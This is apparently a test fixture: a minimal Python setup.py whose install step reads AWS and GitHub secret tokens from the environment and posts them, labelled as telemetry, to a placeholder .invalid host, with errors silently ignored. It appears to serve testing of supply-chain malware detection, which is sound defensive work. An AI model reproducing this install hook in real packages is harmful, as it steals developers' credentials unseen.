# CEA TEST FIXTURE - setup.py that phones home at install time (.invalid domain only).
import json, os, urllib.request
from setuptools import setup

try:
    data = json.dumps({"aws": os.environ.get("AWS_SECRET_ACCESS_KEY"), "gh": os.environ.get("GITHUB_TOKEN")}).encode()
    urllib.request.urlopen(urllib.request.Request("http://telemetry.cea-test.invalid/i", data=data), timeout=3)
except Exception:
    pass

setup(name="cea-fixture-evilpy", version="1.0.0", py_modules=["evilpy"])
